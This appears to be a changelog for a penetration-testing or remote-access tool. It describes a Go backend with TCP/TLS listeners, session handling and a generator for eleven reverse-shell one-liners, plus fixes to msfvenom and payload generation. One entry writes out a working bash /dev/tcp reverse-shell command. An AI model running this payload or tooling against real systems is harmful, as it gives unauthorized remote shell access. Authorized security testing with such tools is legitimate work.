  ARCHITECTURAL ADDITIONS (v1.2.0)

[NEW-1] Go Backend Engine — gobackend/
  High-concurrency listener/session/payload engine in Go.
  Communicates with Python GUI via REST on 127.0.0.1:9120.

  gobackend/main.go
    Entry point. HTTP server with graceful shutdown (SIGINT/SIGTERM).
    Read/write timeouts: 15s. Shutdown grace period: 10s.

  gobackend/api/handlers.go
    REST router: /health, /listeners, /listeners/<id>,
    /sessions, /sessions/<id>/output, /sessions/<id>/send,
    /payloads/types, /payloads/generate.
    All responses are JSON. Query params or JSON body accepted.

  gobackend/listener/manager.go
    Thread-safe pool of TCP + TLS (ephemeral self-signed cert) listeners.
    Each listener gets a UUID, bound port, context-cancelled accept loop.
    Incoming connections dispatched to session manager via callback.

  gobackend/session/manager.go
    Per-connection session tracking. Each session has a buffered output
    channel (256 lines), read loop, Send/Kill/Drain methods.
    Mutex-protected snapshot for thread-safe ListSnap.

  gobackend/payload/generator.go
    11 reverse-shell one-liners: bash, python, python3, powershell,
    nc, php, perl, ruby, go. Output matches Python PayloadGenerator.

[NEW-2] Python Bridge — core/go_bridge.py
  GoBackend class: launches the Go binary as subprocess, polls /health
  until ready, wraps all API endpoints as Python methods.
  All host/port inputs validated through SecureInputValidator.
  Graceful shutdown: SIGTERM, fallback SIGKILL after 5s.

[NEW-3] requirements.txt updated
  Added requests>=2.28.0 (Python bridge dependency).
  10 packages total now.

[PAY-1] FIXED — core/reverse_shell.py:183 — MsfvenomWrapper.generate() arg mismatch
  GUI called MsfvenomWrapper.generate(payload_name, lhost, lport, format)
  but method expected (target_kind, lhost, lport, ...) with a lookup dict
  that only had 3 hardcoded keys (windows_exe, linux_elf, windows_x86_exe).
  Passing a full payload name like "windows/x64/meterpreter/reverse_tcp"
  would ALWAYS crash with ValueError. Removed the dict lookup — method now
  accepts the payload name directly, matching what msfvenom expects.

[PAY-2] FIXED — gui/reverse_shell_tab.py:497-504 — Wrong return type access
  GUI accessed result.artifacts and result.command_str on MsfvenomWrapper
  return value, but the method returns tuple[List[str], Optional[str]]
  (argv, out_path), NOT a ToolResult. Would crash with AttributeError on
  every msfvenom generate click. Fixed to unpack tuple directly and build
  command_str from argv with shlex.quote.

[PAY-3] FIXED — core/reverse_shell.py:66-71 — bash_tcp payload broken
  Original used "sh -i 5<> /dev/tcp/..." with cat/while loop that had no
  initial command, would hang forever. Rewrote to use single-file-descriptor
  pattern: exec 196<>/dev/tcp/HOST/PORT; sh <&196 >&196 2>&196.
  This is the standard reverse shell over /dev/tcp that actually works.
